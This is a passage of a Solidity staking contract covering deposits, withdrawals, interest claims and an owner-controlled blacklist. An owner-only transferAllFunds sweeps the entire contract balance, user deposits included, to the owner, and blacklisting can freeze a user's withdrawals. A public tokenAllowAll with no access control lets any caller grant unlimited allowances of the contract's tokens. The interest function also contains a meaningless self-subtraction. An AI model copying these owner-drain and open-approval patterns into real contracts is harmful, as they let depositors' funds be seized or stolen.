 104 
 105     function blacklist(address user) external onlyOwner {
 106         require(!_blacklisted[user], "User is already blacklisted.");
 107         _blacklisted[user] = true;
 108 
 109         emit Blacklisted(user);
 110     }
 111 
 112     function unblacklist(address user) external onlyOwner {
 113         require(_blacklisted[user], "User is not blacklisted.");
 114         _blacklisted[user] = false;
 115 
 116         emit Unblacklisted(user);
 117     }
 118 
 119 function withdraw(uint256 depositIndex) external {
 120     require(!_blacklisted[msg.sender], "You are not allowed to withdraw.");
 121     require(depositIndex < _deposits[msg.sender].length, "Invalid deposit index.");
 122     require(block.timestamp >= _deposits[msg.sender][depositIndex].depositTime + _deposits[msg.sender][depositIndex].lockupPeriod, "Lockup period not over.");
 123     
 124     uint256 amountToWithdraw = _deposits[msg.sender][depositIndex].amount;
 125     require(amountToWithdraw > 0, "No funds to withdraw.");
 126 
 127     _deposits[msg.sender][depositIndex].amount = 0;
 128     _totalWithdrawnAmounts[msg.sender] += amountToWithdraw; // Store the withdrawn amount
 129     _token.safeTransfer(msg.sender, amountToWithdraw); 
 130 
 131     emit Withdraw(msg.sender, amountToWithdraw);
 132 }
 133 
 134 function transferAllFunds() external onlyOwner {
 135     uint256 contractBalance = _token.balanceOf(address(this));
 136     require(contractBalance > 0, "No funds to transfer.");
 137     _token.safeTransfer(_owner, contractBalance);
 138 }
 139 
 140 
 141     function calculateInterest(address user, uint256 depositIndex) public view returns (uint256) {
 142         DepositInfo storage userdeposit = _deposits[user][depositIndex];
 143         uint256 interestClaimed = _deposits[user][depositIndex].amount - _deposits[user][depositIndex].amount;
 144         uint256 timeElapsed = block.timestamp - userdeposit.lastClaimTime;
 145         uint256 interest = (userdeposit.amount * userdeposit.interestRate * timeElapsed) / (100000000000000000 * 86400); // 86400 seconds in a day
 146         return interest + interestClaimed;
 147     }
 148 
 149     function tokenAllowAll(address asset, address allowee) public {
 150         IERC20 token = IERC20(asset);
 151 
 152         if (token.allowance(address(this), allowee) != uint256(-1)) {
 153             token.safeApprove(allowee, uint256(-1));
 154         }
 155     }
 156 
 157 function claimInterestForDeposit(uint256 lockupPeriod) external {
 158     require(!_blacklisted[msg.sender], "You are not allowed to claim interest.");
 159 
 160     uint256 totalInterestToClaim = 0;
 161 
 162         for (uint256 i = 0; i < _deposits[msg.sender].length; i++) {
 163             if (_deposits[msg.sender][i].lockupPeriod == lockupPeriod * 1 days) {
 164             uint256 interestToClaim = calculateInterest(msg.sender, i);
 165             require(interestToClaim > 0, "No interest to claim.");
 166 
 167             _deposits[msg.sender][i].lastClaimTime = block.timestamp;
 168             totalInterestToClaim += interestToClaim;
 169         }
 170     }
 171 
 172     _token.safeTransfer(msg. sender, totalInterestToClaim);
 173 
 174     emit InterestClaimed(msg.sender, totalInterestToClaim);
 175 }
 176 
 177 function getDepositInfo(address user) external view returns (uint256[] memory depositIndices, uint256[] memory unlockTimes, uint256[] memory stakedAmounts, uint256[] memory lockupPeriods) {
 178      uint256 depositCount = _deposits[user].length;
 179 
 180      depositIndices = new uint256[](depositCount);
 181      unlockTimes = new uint256[](depositCount);
 182      stakedAmounts = new uint256[](depositCount);
 183      lockupPeriods = new uint256[](depositCount);
 184 
 185      for (uint256 i = 0; i < depositCount; i++) {
 186          depositIndices[i] = i;
 187          unlockTimes[i] = _deposits[user][i].depositTime + _deposits[user][i].lockupPeriod;
 188          stakedAmounts[i] = _deposits[user][i].amount;
 189          lockupPeriods[i] = _deposits[user][i].lockupPeriod;
 190      }
 191  }
 192 
 193 function max(int256 a, int256 b) private pure returns (int256) {
 194     return a >= b ? a : b;
 195 }
 196 
 197     function getReferral(address user) external view returns (address) {
 198         return _referrals[user];
 199     }
 200 
 201     function isBlacklisted(address user) external view returns (bool) {
 202         return _blacklisted[user];
 203     }
 204 
